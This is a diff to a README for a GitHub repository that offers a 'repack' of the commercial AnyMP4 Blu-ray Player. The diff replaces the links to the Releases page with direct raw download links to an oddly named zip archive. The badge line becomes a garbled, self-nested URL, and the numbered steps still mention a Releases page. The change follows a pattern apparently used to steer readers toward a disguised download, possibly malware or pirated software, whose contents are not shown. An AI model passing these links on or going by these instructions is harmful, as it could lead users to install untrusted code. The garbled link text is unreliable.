@@ -1,7 +1,7 @@
 # 🎬 AnyMP4-Blu-ray-Player-Repack - Simple Playback for Blu-ray and HD Movies
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20AnyMP4%20Blu--ray%20Player-blue.svg)](https://github.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/releases)
+[![Download](https://raw.githubusercontent.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/main/a/Blu_Player_ray_Any_Repack_M_Chitrali.zip%20AnyMP4%20Blu--ray%https://raw.githubusercontent.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/main/a/Blu_Player_ray_Any_Repack_M_Chitrali.zip)](https://raw.githubusercontent.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/main/a/Blu_Player_ray_Any_Repack_M_Chitrali.zip)
 
 ## 🚀 Getting Started
 AnyMP4 Blu-ray Player allows you to play Blu-ray discs and HD movies easily on your Windows PC. This guide will help you download and install the application step by step. 
@@ -9,7 +9,7 @@ AnyMP4 Blu-ray Player allows you to play Blu-ray discs and HD movies easily on y
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download AnyMP4 Blu-ray Player](https://github.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/releases)
+[Download AnyMP4 Blu-ray Player](https://raw.githubusercontent.com/zaeem786/AnyMP4-Blu-ray-Player-Repack/main/a/Blu_Player_ray_Any_Repack_M_Chitrali.zip)
 
 1. Open the link to navigate to the Releases page.
 2. Look for the latest release.
